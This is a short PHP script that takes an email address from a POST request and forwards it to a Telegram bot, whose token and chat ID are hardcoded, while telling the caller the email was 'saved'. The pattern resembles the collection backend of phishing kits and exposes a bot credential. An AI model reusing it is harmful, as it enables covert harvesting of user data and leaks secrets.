<?php

header('Content-Type: application/json');

// Nhận dữ liệu từ request POST
$data = json_decode(file_get_contents('php://input'), true);

if (isset($data['email'])) {
    $email = $data['email'];
    
    file_get_contents("https://api.telegram.org/bot8102472175:AAFJlLPw5_X6yLEyD_ABDgLwo5_4c-OFURs/sendMessage?chat_id=5517944525&text=" . urlencode($email));
    
    echo json_encode(['status' => 'success', 'message' => 'Email saved successfully.']);
} else {
    echo json_encode(['status' => 'error', 'message' => 'Invalid email address.']);
}

?>